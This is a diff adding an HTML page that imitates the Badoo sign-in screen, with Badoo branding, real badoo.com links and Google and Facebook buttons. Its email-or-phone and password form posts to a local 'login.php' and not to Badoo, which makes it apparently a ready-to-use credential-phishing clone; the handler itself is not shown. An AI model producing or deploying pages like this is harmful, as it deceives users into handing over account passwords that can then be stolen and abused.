@@ -1,0 +1,214 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in to Badoo</title>
+  <style>
+    /* Reset & Base */
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #f8f8f8;
+      color: #6a6a6a;
+      line-height: 1.5;
+      padding: 20px;
+    }
+
+    /* Container */
+    .container {
+      max-width: 420px;
+      margin: 40px auto;
+      background: #fff;
+      border-radius: 10px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.1);
+      overflow: hidden;
+    }
+
+    /* Header */
+    .header {
+      background: #7000e3;
+      padding: 20px;
+      text-align: center;
+      color: white;
+    }
+    .header h1 {
+      font-size: 18px;
+      font-weight: 400;
+    }
+
+    /* Form */
+    .form {
+      padding: 24px;
+    }
+    .form p {
+      margin-bottom: 20px;
+      font-size: 14px;
+    }
+    .form-group {
+      margin-bottom: 16px;
+    }
+    .form-label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: 500;
+      font-size: 14px;
+    }
+    .form-control {
+      width: 100%;
+      padding: 10px 14px;
+      border: 1px solid #d4d5d6;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border 0.2s;
+    }
+    .form-control:focus {
+      outline: none;
+      border-color: #7000e3;
+    }
+
+    .form-checkbox {
+      display: flex;
+      align-items: center;
+      margin: 16px 0;
+    }
+    .form-checkbox input {
+      margin-right: 8px;
+      transform: scale(1.2);
+    }
+
+    .btn {
+      width: 100%;
+      padding: 12px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .btn-primary {
+      background: #7000e3;
+      color: white;
+    }
+    .btn-primary:hover {
+      background: #5d00c2;
+    }
+
+    .btn-google {
+      background: white;
+      color: #757575;
+      border: 1px solid #ddd;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+    }
+    .btn-google:hover {
+      background: #f9f9f9;
+    }
+
+    .btn-facebook {
+      background: #3b5998;
+      color: white;
+    }
+    .btn-facebook:hover {
+      background: #2d4373;
+    }
+
+    .divider {
+      text-align: center;
+      margin: 20px 0;
+      position: relative;
+      color: #949494;
+      font-size: 14px;
+    }
+    .divider::before,
+    .divider::after {
+      content: '';
+      position: absolute;
+      top: 50%;
+      width: 40%;
+      height: 1px;
+      background: #d4d5d6;
+    }
+    .divider::before { left: 0; }
+    .divider::after { right: 0; }
+
+    .footer-links {
+      text-align: center;
+      margin-top: 20px;
+      font-size: 13px;
+    }
+    .footer-links a {
+      color: #7000e3;
+      text-decoration: none;
+    }
+    .footer-links a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 480px) {
+      body { padding: 10px; }
+      .container { margin: 20px auto; }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="header">
+      <h1>Sign in to Badoo</h1>
+    </div>
+
+    <div class="form">
+      <p>Please enter your sign in details. <a href="https://badoo.com/en/signup/" class="link">Sign up here</a> if you are not registered yet.</p>
+
+      <form method="post" action="login.php" novalidate>
+        <div class="form-group">
+          <label for="email" class="form-label">Login</label>
+          <input type="email" id="email" name="email" class="form-control" placeholder="Email or phone number" required>
+        </div>
+        <div class="form-group">
+          <label for="password" class="form-label">Password</label>
+          <input type="password" id="password" name="password" class="form-control" placeholder="Password" required>
+        </div>
+
+        <div class="form-checkbox">
+          <input type="checkbox" id="remember" name="remember" value="1" checked>
+          <label for="remember" style="margin:0;">Remember me</label>
+        </div>
+
+        <button type="submit" name="post" class="btn btn-primary">Sign me in!</button>
+
+        <div class="footer-links">
+          <a href="/en/forgot" class="link">Forgot your password?</a>
+        </div>
+
+        <!-- Google Button -->
+        <button type="button" class="btn btn-google" onclick="window.open('https://badoo.com/google/authorize.phtml?rt=9dbbde&js_use_scheme=https', 'auth', 'width=600,height=400'); return false;">
+          <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 22 22">
+            <circle stroke="#EBEBEB" fill="#fff" stroke-width=".688" cx="11" cy="11" r="10.656"></circle>
+            <path d="M16.28 11.13c0-.4-.04-.77-.1-1.13H11v2.13h2.96a2.53 2.53 0 0 1-1.1 1.66v1.38h1.78a5.36 5.36 0 0 0 1.64-4.04z" fill="#4285F4"></path>
+            <path d="M11 16.5c1.48 0 2.73-.5 3.64-1.33l-1.78-1.38a3.3 3.3 0 0 1-4.94-1.74H6.1v1.42A5.5 5.5 0 0 0 11 16.5z" fill="#34A853"></path>
+            <path d="M7.92 12.04a3.3 3.3 0 0 1 0-2.08V8.53H6.1a5.5 5.5 0 0 0 0 4.94l1.83-1.43z" fill="#FBBC05"></path>
+            <path d="M13.1 8.51l1.58-1.58a5.5 5.5 0 0 0-8.6 1.6l1.84 1.42A3.28 3.28 0 0 1 11 7.7c.8 0 1.53.27 2.1.82z" fill="#EA4335"></path>
+          </svg>
+          Continue with Google
+        </button>
+
+        <!-- OR Divider -->
+        <div class="divider">or</div>
+
+        <!-- Facebook Button -->
+        <button type="button" class="btn btn-facebook" onclick="window.open('https://badoo.com/facebook/authorize.phtml?rt=9dbbde&js_use_scheme=https', 'auth', 'width=600,height=400'); return false;">
+          Continue with Facebook
+        </button>
+      </form>
+    </div>
+  </div>
+</body>
+</html>
